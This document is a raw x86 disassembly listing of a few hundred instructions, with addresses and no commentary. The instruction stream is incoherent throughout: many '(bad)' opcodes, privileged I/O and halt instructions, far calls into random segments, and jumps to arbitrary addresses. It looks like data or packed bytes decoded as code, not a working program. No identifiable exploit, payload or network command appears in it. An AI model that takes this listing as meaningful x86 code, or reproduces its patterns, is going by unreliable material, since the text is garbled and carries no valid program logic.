  41b675:	add    ah,dh
  41b677:	add    al,0x0
  41b679:	add    BYTE PTR [esi-0x112f7fbd],al
  41b67f:	pushf  
  41b680:	sbb    DWORD PTR [ebx-0x4e],esp
  41b683:	xor    esi,edx
  41b685:	sub    bl,al
  41b687:	xchg   esp,eax
  41b688:	mov    WORD PTR [esi],ds
  41b68a:	jae    0x41b659
  41b68c:	ja     0x41b6b6
  41b68e:	pusha  
  41b68f:	data16 sub BYTE PTR [ebp+0x62],ah
  41b693:	outs   dx,BYTE PTR ds:[esi]
  41b694:	ret    
  41b695:	sbb    dl,al
  41b697:	fwait
  41b698:	mov    cl,0x6f
  41b69a:	push   esi
  41b69b:	mov    edx,DWORD PTR [ecx]
  41b69d:	das    
  41b69e:	in     eax,0x6b
  41b6a0:	xchg   edi,eax
  41b6a1:	cdq    
  41b6a2:	sahf   
  41b6a3:	xor    ecx,DWORD PTR [ecx+0x6a7f3edd]
  41b6a9:	sti    
  41b6aa:	sub    al,0x4f
  41b6ac:	inc    ebp
  41b6ad:	daa    
  41b6ae:	fild   DWORD PTR [ecx-0x74]
  41b6b1:	inc    edi
  41b6b2:	lea    ebx,[ecx+0x404de1bc]
  41b6b8:	stc    
  41b6b9:	jmp    0x41b700
  41b6bb:	out    dx,al
  41b6bc:	inc    ebx
  41b6bd:	cwde   
  41b6be:	cs jl  0x41b67f
  41b6c1:	inc    edi
  41b6c2:	xor    al,BYTE PTR [esi]
  41b6c4:	hlt    
  41b6c5:	iret   
  41b6c6:	loop   0x41b6aa
  41b6c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6c9:	arpl   WORD PTR [ebp-0x6d],bx
  41b6cc:	repz adc BYTE PTR [esi+0x5d8854a9],0x1c
  41b6d4:	pop    edx
  41b6d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6d7:	adc    edx,eax
  41b6d9:	sbb    edx,DWORD PTR [ebp+0x60]
  41b6dc:	push   ebx
  41b6dd:	outs   dx,DWORD PTR ds:[esi]
  41b6de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6df:	leave  
  41b6e0:	mov    eax,ds:0x27ab0074
  41b6e5:	stc    
  41b6e6:	cmc    
  41b6e7:	fcomp  QWORD PTR [ecx+0x16]
  41b6ea:	retf   
  41b6eb:	ror    edi,0xb4
  41b6ee:	pop    es
  41b6ef:	fsub   DWORD PTR [edx-0x7f]
  41b6f2:	dec    esi
  41b6f3:	test   BYTE PTR [ebp-0x5a],dh
  41b6f6:	mov    ds:0x58adf287,eax
  41b6fb:	stos   DWORD PTR es:[edi],eax
  41b6fc:	add    bl,BYTE PTR [edi+0x1666ad73]
  41b702:	sbb    eax,0x7a6eeea8
  41b707:	scas   al,BYTE PTR es:[edi]
  41b708:	mov    bl,0x2d
  41b70a:	out    0x76,eax
  41b70c:	arpl   WORD PTR [eax+0x2b49beba],si
  41b712:	fdiv   QWORD PTR [eax+eax*4+0x4f]
  41b716:	sbb    al,al
  41b718:	adc    al,0x64
  41b71a:	mov    cl,0x2f
  41b71c:	loopne 0x41b6e6
  41b71e:	test   eax,0x81929c4c
  41b723:	retf   0xe28d
  41b726:	adc    DWORD PTR [edx+0x49],edi
  41b729:	lahf   
  41b72a:	xor    BYTE PTR [eax+0x51],ah
  41b72d:	inc    ebx
  41b72e:	cdq    
  41b72f:	loop   0x41b770
  41b731:	pusha  
  41b732:	lods   al,BYTE PTR ds:[esi]
  41b733:	adc    ecx,DWORD PTR [edx+0x35407af8]
  41b739:	xchg   eax,esp
  41b73b:	mov    esi,0x57778276
  41b740:	stos   DWORD PTR es:[edi],eax
  41b741:	fsubr  DWORD PTR [eax+0x2e828d8d]
  41b747:	mov    al,ds:0x5f56eaaf
  41b74c:	imul   eax,DWORD PTR [ebp+0x3c],0x4fb86907
  41b753:	call   0x809048c2
  41b758:	(bad)  
  41b759:	xchg   edi,eax
  41b75a:	push   ds
  41b75b:	(bad)  
  41b75c:	sbb    al,0xfc
  41b75e:	hlt    
  41b75f:	loopne 0x41b79d
  41b761:	bound  ecx,QWORD PTR [ebx+0x17]
  41b764:	or     al,0xd1
  41b766:	pop    edi
  41b767:	sbb    DWORD PTR [edi+0x23],edi
  41b76a:	popa   
  41b76b:	sahf   
  41b76c:	lea    edx,[edx]
  41b76e:	fwait
  41b76f:	addr16 daa 
  41b771:	pop    ds
  41b772:	in     eax,dx
  41b773:	fiadd  WORD PTR [esi+0x2dac70b6]
  41b779:	jmp    0x41b781
  41b77b:	cwde   
  41b77c:	add    bl,BYTE PTR [edx]
  41b77e:	push   eax
  41b77f:	dec    edx
  41b780:	dec    ecx
  41b781:	sbb    dh,0x78
  41b784:	stc    
  41b785:	mov    esp,0x85a0e1ee
  41b78a:	push   edi
  41b78b:	(bad)  
  41b78c:	cdq    
  41b78d:	jmp    0x41b717
  41b78f:	push   ebx
  41b790:	cmp    DWORD PTR [ebx+0x3c],edi
  41b793:	addr16 xchg ecx,eax
  41b795:	repnz pop eax
  41b797:	push   cs
  41b798:	dec    ecx
  41b799:	ret    0xfbc3
  41b79c:	(bad)  
  41b79d:	test   eax,0x1988dd54
  41b7a2:	sti    
  41b7a3:	les    edi,FWORD PTR [esi+0x6e847e40]
  41b7a9:	pop    ds
  41b7aa:	and    al,0x6a
  41b7ac:	out    dx,al
  41b7ad:	test   al,0x35
  41b7af:	(bad)  
  41b7b1:	rol    ch,cl
  41b7b3:	pop    esp
  41b7b4:	stos   DWORD PTR es:[edi],eax
  41b7b5:	mov    DWORD PTR [edx],edi
  41b7b7:	push   eax
  41b7b8:	bound  esp,QWORD PTR [eax+0xad02bb7]
  41b7be:	and    BYTE PTR [ebx+ebx*4],bl
  41b7c1:	dec    edx
  41b7c2:	aaa    
  41b7c3:	mov    edi,0x704ee95d
  41b7c8:	cmp    bh,BYTE PTR [edx-0x43]
  41b7cb:	scas   al,BYTE PTR es:[edi]
  41b7cc:	and    BYTE PTR [ebp+0x9],al
  41b7cf:	inc    ebx
  41b7d0:	jle    0x41b780
  41b7d2:	inc    eax
  41b7d3:	push   cs
  41b7d4:	xchg   esi,eax
  41b7d5:	push   edx
  41b7d6:	ins    BYTE PTR es:[edi],dx
  41b7d7:	(bad)  
  41b7d9:	icebp  
  41b7da:	test   eax,0xbbc2309c
  41b7df:	mov    DWORD PTR [ecx+0x282a3f3b],ebp
  41b7e5:	or     dh,bl
  41b7e7:	fs add al,0x60
  41b7ea:	xor    ch,0x33
  41b7ed:	cmp    esp,edx
  41b7ef:	adc    DWORD PTR [ebx],0x1e
  41b7f2:	in     eax,dx
  41b7f3:	dec    ecx
  41b7f4:	adc    BYTE PTR [ebp-0x25],bl
  41b7f7:	shl    BYTE PTR [edx+eax*4-0x76ec1ee],0x12
  41b7ff:	mov    esi,0xe6e96af5
  41b804:	or     dl,BYTE PTR [edx+0x1a]
  41b807:	enter  0x3873,0xee
  41b80b:	cdq    
  41b80c:	mul    DWORD PTR [ecx+0x76]
  41b80f:	jmp    0x99abfbc4
  41b814:	pop    edx
  41b815:	test   BYTE PTR [esp+edx*1],dh
  41b818:	xchg   esp,eax
  41b819:	mov    dh,al
  41b81b:	es daa 
  41b81d:	inc    edx
  41b81e:	lods   al,BYTE PTR ds:[esi]
  41b81f:	jae    0x41b844
  41b821:	loopne 0x41b7ed
  41b823:	mov    esi,0xa5ef13bc
  41b828:	pop    ds
  41b829:	lea    eax,[ecx-0x6cf52c57]
  41b82f:	sub    eax,0x1d83aa96
  41b834:	mov    ah,0xce
  41b836:	push   cs
  41b837:	sbb    al,0x27
  41b839:	mov    edi,0x76fb0e4b
  41b83e:	or     ch,bh
  41b840:	adc    BYTE PTR [ebp+edx*1+0x4d7483f7],dh
  41b847:	add    DWORD PTR [eax-0x4],ebx
  41b84a:	shl    eax,1
  41b84c:	jg     0x41b831
  41b84e:	loop   0x41b855
  41b850:	rcr    DWORD PTR [edx],cl
  41b852:	js     0x41b851
  41b854:	and    edx,DWORD PTR [ebp+eax*1+0x3dee85bf]
  41b85b:	adc    eax,0x635806bd
  41b860:	rcl    BYTE PTR [esi],cl
  41b862:	out    dx,eax
  41b863:	mov    ebx,0xb2ee70aa
  41b868:	dec    ebp
  41b869:	retf   
  41b86a:	test   eax,0xdc96ae54
  41b86f:	cdq    
  41b870:	mov    eax,0x911faf36
  41b875:	rol    BYTE PTR ds:[edi],0x1b
  41b879:	adc    ebx,DWORD PTR [esi+0x60]
  41b87c:	jmp    0x32dc00c7
  41b881:	mov    ebx,esi
  41b883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b884:	push   ecx
  41b885:	sub    BYTE PTR [ebx+0x19],cl
  41b888:	out    dx,eax
  41b889:	adc    edi,DWORD PTR [ecx]
  41b88b:	jno    0x41b884
  41b88d:	pop    ebp
  41b88e:	fwait
  41b88f:	adc    bh,BYTE PTR [ebx]
  41b891:	ja     0x41b8f6
  41b893:	scas   eax,DWORD PTR es:[edi]
  41b894:	dec    esi
  41b895:	add    eax,0x67a47f32
  41b89a:	ins    DWORD PTR es:[edi],dx
  41b89b:	retf   
  41b89c:	fst    DWORD PTR [ebx+esi*2]
  41b89f:	mov    al,0xf7
  41b8a1:	push   ss
  41b8a2:	stos   DWORD PTR es:[edi],eax
  41b8a3:	nop
  41b8a4:	pop    eax
  41b8a5:	repz xor eax,0x1e36f4d9
  41b8ab:	xchg   ecx,eax
  41b8ac:	mov    BYTE PTR [edi],al
  41b8ae:	mov    eax,ds:0x350fca0c
  41b8b3:	push   ebx
  41b8b4:	inc    edx
  41b8b5:	add    DWORD PTR [ebx+0x51],0xffffffbe
  41b8b9:	jbe    0x41b913
  41b8bb:	in     al,dx
  41b8bc:	mov    edi,0x98946ad4
  41b8c1:	jno    0x41b86d
  41b8c3:	popa   
  41b8c4:	cmp    DWORD PTR [edi+0x9c05da8],0x4c87f6c2
  41b8ce:	jge    0x41b8ba
  41b8d0:	ret    0x92e7
  41b8d3:	sub    dh,ch
  41b8d5:	xor    bh,BYTE PTR [esi+ebp*1+0x5a]
  41b8d9:	(bad)  
  41b8da:	aaa    
  41b8db:	push   es
  41b8dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8dd:	and    DWORD PTR [ecx+ecx*8-0x1f10d0fa],esp
  41b8e4:	out    0x41,eax
  41b8e6:	sub    al,0x41
  41b8e8:	or     bh,BYTE PTR [esi+ecx*4]
  41b8eb:	dec    eax
  41b8ec:	push   esi
  41b8ed:	pop    DWORD PTR [ebp-0x18b781b5]
  41b8f3:	call   0x787a26db
  41b8f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8f9:	cmp    cl,bh
  41b8fb:	dec    esp
  41b8fc:	leave  
  41b8fd:	add    ch,cl
  41b8ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b900:	cmp    eax,0xde8de9d5
  41b905:	mov    ds:0xebb8e8d0,eax
  41b90a:	adc    BYTE PTR [edi-0x5b],al
  41b90d:	int    0x88
  41b90f:	pop    ss
  41b910:	adc    bl,bh
  41b912:	push   esp
  41b913:	rol    BYTE PTR [ebp+0x2e],0x7b
  41b917:	leave  
  41b918:	add    bl,BYTE PTR [edx]
  41b91a:	loopne 0x41b8ec
  41b91c:	and    DWORD PTR [esi*4-0x297ee070],0x30226ff4
  41b927:	scas   eax,DWORD PTR es:[edi]
  41b928:	jmp    0x9412feff
  41b92d:	mov    dh,0x16
  41b92f:	jecxz  0x41b90c
  41b931:	std    
  41b932:	fild   WORD PTR [edi]
  41b934:	sbb    eax,0x36324ea2
  41b939:	mov    ch,0xcc
  41b93b:	ror    ebx,1
  41b93d:	stos   BYTE PTR es:[edi],al
  41b93e:	lods   al,BYTE PTR ds:[esi]
  41b93f:	or     eax,DWORD PTR [edi]
  41b941:	ins    BYTE PTR es:[edi],dx
  41b942:	in     eax,0xc5
  41b944:	cdq    
  41b945:	mov    DWORD PTR [ecx],eax
  41b947:	add    BYTE PTR [eax-0x77f652fd],ch
  41b94d:	inc    esi
  41b94e:	(bad)  
  41b94f:	stc    
  41b950:	sbb    eax,0x5b69587
  41b955:	jno    0x41b992
  41b957:	int    0x6d
  41b959:	sbb    al,0x30
  41b95b:	cmp    edx,DWORD PTR [ecx]
  41b95d:	cmp    bh,bh
  41b95f:	xchg   BYTE PTR [edi+ebp*2-0x63943744],ah
  41b966:	dec    ecx
  41b967:	adc    al,0x24
  41b969:	dec    edx
  41b96a:	int    0x6c
  41b96c:	mov    esi,0x1c51b02b
  41b971:	sub    BYTE PTR [eax],0xe5
  41b974:	inc    BYTE PTR [edi]
  41b976:	sahf   
  41b977:	enter  0x40f7,0xe8
  41b97b:	adc    DWORD PTR [ebx-0x2dfa502f],edi
  41b981:	sahf   
  41b982:	inc    ebx
  41b983:	pop    edi
  41b984:	imul   eax,DWORD PTR [edx-0x22f59fb6],0x65
  41b98b:	pop    ss
  41b98c:	push   ebp
  41b98d:	jnp    0x41b941
  41b98f:	xor    al,0x71
  41b991:	scas   eax,DWORD PTR es:[edi]
  41b992:	add    al,0xf1
  41b994:	call   0xecaa:0xfc5b01f2
  41b99b:	and    al,0x39
  41b99d:	cmp    DWORD PTR [ebx+0x72],ebx
  41b9a0:	push   es
  41b9a1:	out    dx,eax
  41b9a2:	call   0x4800:0xf06653cf
  41b9a9:	aad    0x88
  41b9ab:	mov    ecx,DWORD PTR [esi+0x2e]
  41b9ae:	sub    dl,BYTE PTR [edi+0x3b9f7f3c]
  41b9b4:	pop    edx
  41b9b5:	sub    edi,DWORD PTR [ebx]
  41b9b7:	ss xchg edi,ebx
  41b9ba:	jmp    0x41b990
  41b9bc:	or     dh,BYTE PTR [eax]
  41b9be:	jp     0x41b94b
  41b9c0:	sti    
  41b9c1:	mov    BYTE PTR [edx+eax*2+0x3d31f4ea],ah
  41b9c8:	lods   al,BYTE PTR ds:[esi]
  41b9c9:	xchg   ebp,eax
  41b9ca:	inc    BYTE PTR [ecx]
  41b9cc:	rcr    DWORD PTR [edi-0x2e],1
  41b9cf:	(bad)
  41b9d2:	iret   
  41b9d3:	mov    ecx,0x4f126858
  41b9d8:	aaa    
  41b9d9:	in     eax,dx
  41b9da:	inc    edx
  41b9db:	repz pusha 
  41b9dd:	mov    eax,0x18d9d9fe
  41b9e2:	cs cmp eax,0x683f15ef
  41b9e8:	lds    esi,FWORD PTR [eax+0x67844fa3]
  41b9ee:	sbb    BYTE PTR [edi+ebx*4-0x4e],0xeb
  41b9f3:	dec    ebp
  41b9f4:	sbb    ebx,DWORD PTR [ecx+0x4bc853fd]
  41b9fa:	pop    ebx
  41b9fb:	jle    0x41b997
  41b9fd:	test   DWORD PTR [eax],esi
  41b9ff:	sub    edx,ecx
  41ba01:	lahf   
  41ba02:	and    BYTE PTR [edx+0xd7d4550],0xab
  41ba09:	adc    esi,DWORD PTR [eax]
  41ba0b:	into   
  41ba0c:	pop    ds
  41ba0d:	hlt    
  41ba0e:	pop    dx
  41ba10:	test   DWORD PTR [ebp+edi*4+0x59],ebp
  41ba14:	xchg   ecx,eax
  41ba15:	pop    ebp
  41ba16:	into   
  41ba17:	(bad)  
  41ba1a:	imul   eax,esp,0xb6fe5d12
  41ba20:	sbb    BYTE PTR [ecx-0x29b92e33],ah
  41ba26:	xchg   ecx,edi
  41ba28:	jp     0x41b9b9
  41ba2a:	push   ebx
  41ba2b:	inc    ebp
  41ba2c:	push   ecx
  41ba2d:	push   ebp
  41ba2e:	dec    edx
  41ba2f:	jle    0x41b9b7
  41ba31:	(bad)  [edx+0x3a]
  41ba34:	xor    al,0x8f
  41ba36:	xchg   esp,eax
  41ba37:	mov    eax,0xd02764c8
  41ba3c:	mov    edx,0x9dc83059
  41ba41:	cdq    
  41ba42:	scas   eax,DWORD PTR es:[edi]
  41ba43:	jae    0x41ba74
  41ba45:	sub    ah,BYTE PTR [edi-0x22]
  41ba48:	sahf   
  41ba49:	mov    bl,0xd4
  41ba4b:	push   cs
  41ba4c:	stos   BYTE PTR es:[edi],al
  41ba4d:	or     ah,BYTE PTR ds:0xdc1ff39e
  41ba53:	aaa    
  41ba54:	sub    al,0xad
  41ba56:	push   es
  41ba57:	xor    al,0xf9
  41ba59:	pop    edi
  41ba5a:	fs push 0xef06c1dd
  41ba60:	jmp    0x3a21:0x836ffab0
  41ba67:	fadd   QWORD PTR [ebx+edi*1]
  41ba6a:	inc    ecx
  41ba6b:	and    dh,BYTE PTR [edi+0x7]
  41ba6e:	dec    esi
  41ba6f:	aas    
  41ba70:	mov    ecx,DWORD PTR [edx-0x9]
  41ba73:	pop    edi
  41ba74:	push   ebx
  41ba75:	mov    eax,esp
  41ba77:	dec    edi
  41ba78:	dec    esp
  41ba79:	(bad)  
  41ba7a:	lods   eax,DWORD PTR ds:[esi]
  41ba7b:	ret    0x87a
  41ba7e:	mov    dl,0xfe
  41ba80:	push   esp
  41ba81:	int3   
  41ba82:	fs retf 0x923
  41ba86:	dec    esp
  41ba87:	inc    ebp
  41ba88:	stc    
  41ba89:	inc    esp
  41ba8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba8b:	jmp    DWORD PTR [ecx-0x17]
  41ba8e:	jns    0x41ba98
  41ba90:	rcl    DWORD PTR [ecx],1
  41ba92:	sub    eax,0x5ad38ff8
  41ba97:	xchg   edx,eax
  41ba98:	popf   
  41ba99:	mov    ss,WORD PTR [ebx]
  41ba9b:	test   BYTE PTR [esi-0x18],ch
  41ba9e:	pop    edi
  41ba9f:	or     edx,DWORD PTR [esp+ebx*1]
  41baa2:	jo     0x41babb
  41baa4:	scas   al,BYTE PTR es:[edi]
  41baa5:	pop    esp
  41baa6:	iret   
  41baa7:	arpl   WORD PTR ds:0x9210a031,di
  41baad:	or     BYTE PTR [edx+0x18],0xdd
  41bab1:	inc    edx
  41bab2:	adc    BYTE PTR [ebx-0x46],dl
  41bab5:	mov    ebp,0xbe3d083c
  41baba:	jle    0x41bace
  41babc:	outs   dx,DWORD PTR ds:[esi]
  41babd:	pop    es
  41babe:	ins    BYTE PTR es:[edi],dx
  41babf:	out    dx,al
  41bac0:	mov    DWORD PTR [ecx-0x31],edi
  41bac3:	dec    ebp
  41bac4:	fdivp  st(4),st
  41bac6:	sbb    BYTE PTR [ebp+0x5984946d],0xd3
  41bacd:	dec    DWORD PTR [eax-0x5cb10239]
  41bad3:	out    0x4a,eax
  41bad5:	push   es
  41bad6:	mov    ch,0xa
  41bad8:	xor    esp,DWORD PTR [eax-0x4e]
  41badb:	loopne 0x41bade
  41badd:	les    ebx,FWORD PTR [edi-0x74]
  41bae0:	adc    al,0x4
  41bae2:	lahf   
  41bae3:	push   ss
  41bae4:	out    0x70,al
  41bae6:	mov    esi,0x82f81d61
  41baeb:	ins    BYTE PTR es:[edi],dx
  41baec:	(bad)  
  41baed:	jl     0x41bb44
  41baef:	or     al,0xaf
  41baf1:	cmp    al,0x56
  41baf3:	addr16 dec ecx
  41baf5:	sub    ecx,ecx
  41baf7:	mov    dl,0x66
  41baf9:	fdiv   st,st(6)
  41bafb:	push   0xfffffffd
  41bafd:	fcmovu st,st(4)
  41baff:	loop   0x41bb38
  41bb01:	cmc    
  41bb02:	mov    edx,edx
  41bb04:	push   esp
  41bb05:	mov    cl,bl
  41bb07:	(bad)  
  41bb08:	jbe    0x41baff
  41bb0a:	push   ss
  41bb0b:	neg    DWORD PTR [edi-0x1b52191f]
  41bb11:	into   
  41bb12:	and    ecx,0xffffffde
  41bb15:	rcr    DWORD PTR ds:0x415620ca,1
  41bb1b:	lock cdq 
  41bb1d:	mov    ds:0xce100c90,al
  41bb22:	scas   al,BYTE PTR es:[edi]
  41bb23:	ss dec esp
  41bb25:	inc    esi
  41bb26:	repnz push eax
  41bb28:	je     0x41bb43
  41bb2a:	jae    0x41bb90
  41bb2c:	rcr    BYTE PTR [eax+0x129a08a0],cl
  41bb32:	ret    
  41bb33:	sub    cl,BYTE PTR [ebp+0x14]
  41bb36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb37:	aaa    
  41bb38:	ja     0x41bb10
  41bb3a:	fdiv   st(1),st
  41bb3c:	adc    al,BYTE PTR [esi+0x4e]
  41bb3f:	sub    eax,0xefe53976
  41bb44:	outs   dx,DWORD PTR ds:[esi]
  41bb45:	call   0x32c1e3d7
  41bb4a:	mov    ah,bh
  41bb4c:	lock push ecx
  41bb4e:	(bad)  [edi-0x3abfe4c5]
  41bb54:	cdq    
  41bb55:	lock adc eax,0xc1c56e1a
  41bb5b:	aaa    
  41bb5c:	mov    dh,0xd9
  41bb5e:	iret   
  41bb5f:	into   
  41bb60:	sti    
  41bb61:	dec    ebx
  41bb62:	(bad)  
  41bb63:	add    edi,DWORD PTR [edi-0x2445f43a]
  41bb69:	sahf   
  41bb6a:	in     eax,0xcf
  41bb6c:	jnp    0x41baf7
  41bb6e:	add    BYTE PTR [eax],al
  41bb70:	add    BYTE PTR [eax],al
  41bb72:	out    0x40,al
  41bb74:	sbb    eax,0xee5dbf15
  41bb79:	repz adc eax,0xa1442583
  41bb7f:	daa    
  41bb80:	push   edi
  41bb81:	and    ecx,DWORD PTR [ecx-0xbfffec9]
  41bb87:	add    al,0x0
  41bb89:	add    BYTE PTR [esi],ah
  41bb8b:	int3   
  41bb8c:	out    0x5e,eax
  41bb8e:	add    esp,eax
  41bb90:	imul   eax,DWORD PTR [ebx+0x7b770c1c],0x3d888e91
  41bb9a:	and    BYTE PTR [ebx],dh
  41bb9c:	mov    esp,0x30c1eb28
  41bba1:	ds stos BYTE PTR es:[edi],al
  41bba3:	mov    ecx,0xb41b87e2
  41bba8:	jmp    0xc5ba:0x8bf9c284
  41bbaf:	cmp    bh,BYTE PTR [edx+0x3d]
  41bbb2:	aaa    
  41bbb3:	outs   dx,DWORD PTR ds:[esi]
  41bbb4:	adc    DWORD PTR [ecx+0x7bbc9fd6],ebp
  41bbba:	or     ch,ah
  41bbbc:	fxch   st(3)
  41bbbe:	xchg   esi,eax
  41bbbf:	imul   eax,DWORD PTR [edx-0x2b],0x1ed6f9bf
  41bbc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbc7:	jnp    0x41bbca
  41bbc9:	xchg   DWORD PTR [eax+0x4c4f1ab2],esp
  41bbcf:	out    0xb2,eax
  41bbd1:	pop    edx
  41bbd2:	clc    
  41bbd3:	inc    edi
  41bbd4:	xchg   ecx,eax
  41bbd5:	dec    edx
  41bbd6:	sti    
  41bbd7:	sub    eax,0x5ca59fa2
  41bbdc:	das    
  41bbdd:	or     edi,DWORD PTR [esi-0x28]
  41bbe0:	dec    edi
  41bbe1:	popa   
  41bbe2:	mov    BYTE PTR [eax-0x47],dh
  41bbe5:	sbb    dl,BYTE PTR [esi+0x7]
  41bbe8:	cmp    esp,esp
  41bbea:	repnz stos DWORD PTR es:[edi],eax
  41bbec:	sub    DWORD PTR [ebp+0x3a],esp
  41bbef:	add    BYTE PTR [eax+0x1951b005],al
  41bbf5:	pop    edi
  41bbf6:	jge    0x41bc0f
  41bbf8:	or     BYTE PTR [edi],dl
  41bbfa:	xchg   edi,eax
  41bbfb:	mov    bl,0x97
  41bbfd:	mov    WORD PTR [edx-0x28ec543f],?
  41bc03:	xchg   ecx,eax
  41bc04:	or     eax,0xe5dd7d68
  41bc09:	sub    ebx,DWORD PTR [edi+0x9]
  41bc0c:	scas   al,BYTE PTR es:[edi]
  41bc0d:	jp     0x41bbbb
  41bc0f:	jne    0x41bc3c
  41bc11:	fisub  DWORD PTR [edi-0x28]
  41bc14:	push   0xb
  41bc16:	fnstcw WORD PTR [esp+eax*1-0x46]
  41bc1a:	or     ecx,DWORD PTR [esi-0x11]
  41bc1d:	mov    esi,0xeb89b2b4
  41bc22:	xchg   esi,eax
  41bc23:	or     BYTE PTR [esi+0x1c0ed4e3],dl
  41bc29:	sbb    BYTE PTR [edx+0x3b],bh
  41bc2c:	shl    DWORD PTR [ecx-0x157f3908],cl
  41bc32:	adc    edi,esi
  41bc34:	into   
  41bc35:	sti    
  41bc36:	push   ss
  41bc37:	pop    esp
  41bc38:	jmp    0xed88fa52
  41bc3d:	out    0x9,eax
  41bc3f:	arpl   cx,dx
  41bc41:	jg     0x41bc08
  41bc43:	cwde   
  41bc44:	push   edi
  41bc45:	es pop edx
  41bc47:	dec    edx
  41bc48:	mov    eax,0xa4079e9d
  41bc4d:	push   ebp
  41bc4e:	pcmpgtw mm1,mm4
  41bc51:	push   ds
  41bc52:	or     bh,BYTE PTR [edx-0x80a9c62]
  41bc58:	loopne 0x41bcc6
  41bc5a:	aad    0xd7
  41bc5c:	icebp  
  41bc5d:	mov    al,0x88
  41bc5f:	in     al,0x93
  41bc61:	sbb    al,0x4a
  41bc63:	inc    edx
  41bc64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc65:	pusha  
  41bc66:	sub    edx,DWORD PTR [ecx]
  41bc68:	jge    0x41bc8d
  41bc6a:	push   cs
  41bc6b:	add    BYTE PTR [esi+0x40cffd23],0x84
  41bc72:	pop    ebp
  41bc73:	inc    edx
  41bc74:	lods   al,BYTE PTR ds:[esi]
  41bc75:	mul    DWORD PTR [edi+0x10]
  41bc78:	or     BYTE PTR [ebp+esi*8+0x50],dl
  41bc7c:	mov    bl,0xbe
  41bc7e:	xchg   ebp,eax
  41bc7f:	cmp    ebx,DWORD PTR [edi]
  41bc81:	dec    ecx
  41bc82:	fcmovbe st,st(5)
  41bc84:	push   eax
  41bc85:	jmp    0xaf8e0798
  41bc8a:	ja     0x41bc77
  41bc8c:	adc    edx,ebp
  41bc8e:	ds ins BYTE PTR es:[edi],dx
  41bc90:	test   BYTE PTR [edx],bl
  41bc92:	in     eax,dx
  41bc93:	nop
  41bc94:	fs imul ebp,eax,0xffffffb8
  41bc98:	call   0x21f7:0x44f718a1
  41bc9f:	jmp    0x41bc23
  41bca1:	sbb    ch,BYTE PTR [ecx+0x2aa90c14]
  41bca7:	pusha  
  41bca8:	call   0xb66e:0x7a24ed18
  41bcaf:	into   
  41bcb0:	push   ebx
  41bcb1:	pusha  
  41bcb2:	(bad)  [ebp-0x4ea623a5]
  41bcb8:	sub    ebx,DWORD PTR [esi+0x73a8c358]
  41bcbe:	jo     0x41bc47
  41bcc0:	aas    
  41bcc1:	mov    ds:0xcf78b84e,eax
  41bcc6:	jns    0x41bc64
  41bcc8:	dec    ecx
  41bcc9:	pop    ds
  41bcca:	sahf   
  41bccb:	mov    edi,0x97d73c69
  41bcd0:	out    0x6d,al
  41bcd2:	ficom  DWORD PTR [edx+0x48]
  41bcd5:	xchg   edx,eax
  41bcd6:	mov    ch,0x1d
  41bcd8:	aam    0x40
  41bcda:	add    edi,DWORD PTR gs:[ebx-0x1d0b0299]
  41bce1:	clc    
  41bce2:	shr    BYTE PTR [eax+0x31],0xb2
  41bce6:	pop    ss
  41bce7:	popf   
  41bce8:	ss xor ebp,esp
  41bceb:	ins    BYTE PTR es:[edi],dx
  41bcec:	and    al,0x79
  41bcee:	frstor [ecx+edx*8+0x43155b02]
  41bcf5:	fstp   DWORD PTR [ebx+0x1affbf93]
  41bcfb:	or     ebx,DWORD PTR [eax+edx*4]
  41bcfe:	jge    0x41bcf9
  41bd00:	fisttp DWORD PTR [esi+0x7c]
  41bd03:	out    0xe,eax
  41bd05:	sbb    ecx,edi
  41bd07:	ror    DWORD PTR [ecx],cl
  41bd09:	cdq    
  41bd0a:	or     eax,0x3f63e83d
  41bd0f:	xchg   ecx,eax
  41bd10:	mov    esp,0xc452024c
  41bd15:	pusha  
  41bd16:	xchg   edi,eax
  41bd17:	jle    0x41bd93
  41bd19:	outs   dx,BYTE PTR ds:[esi]
  41bd1a:	and    al,0x15
  41bd1c:	cmc    
  41bd1d:	(bad)  
  41bd1e:	cmp    dl,dh
  41bd20:	(bad)  
  41bd21:	xchg   esi,eax
  41bd22:	push   ecx
  41bd23:	pushf  
  41bd24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd25:	jg     0x41bd65
  41bd27:	mov    bh,0x85
  41bd29:	je     0x41bd14
  41bd2b:	xchg   ebp,eax
  41bd2c:	adc    al,0xcc
  41bd2e:	pop    esi
  41bd2f:	(bad)  
  41bd30:	call   0x3b2b04b5
  41bd35:	aad    0x9a
  41bd37:	push   eax
  41bd38:	outs   dx,BYTE PTR ds:[esi]
  41bd39:	(bad)  
  41bd3a:	(bad)  
  41bd3b:	ret    0x9dc5
  41bd3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd3f:	mov    ds:0x8a61378e,al
  41bd44:	retf   
  41bd45:	imul   DWORD PTR [ebx+edx*4-0x64]
  41bd49:	mov    cl,0x31
  41bd4b:	xor    eax,0xbb5dc599
  41bd50:	(bad)  
  41bd51:	fisub  DWORD PTR [ebx-0x30c663e8]
  41bd57:	xchg   ecx,eax
  41bd58:	adc    eax,0xa4f8c77a
  41bd5d:	aaa    
  41bd5e:	mov    edi,0x49f36e73
  41bd63:	push   esp
  41bd64:	nop
  41bd65:	test   BYTE PTR [ebp+0x26a25617],bh
  41bd6b:	dec    edi
  41bd6c:	inc    ecx
  41bd6d:	lahf   
  41bd6e:	xor    eax,0xacca7027
  41bd73:	push   esi
  41bd74:	xor    bl,BYTE PTR [ebx]
  41bd76:	icebp  
  41bd77:	sub    BYTE PTR [edi+0x53],bh
  41bd7a:	icebp  
  41bd7b:	int    0x5c
  41bd7d:	int    0xd0
  41bd7f:	cdq    
  41bd80:	fst    QWORD PTR [edi+0x6b]
  41bd83:	and    ch,ah
  41bd85:	pop    esi
  41bd86:	ret    
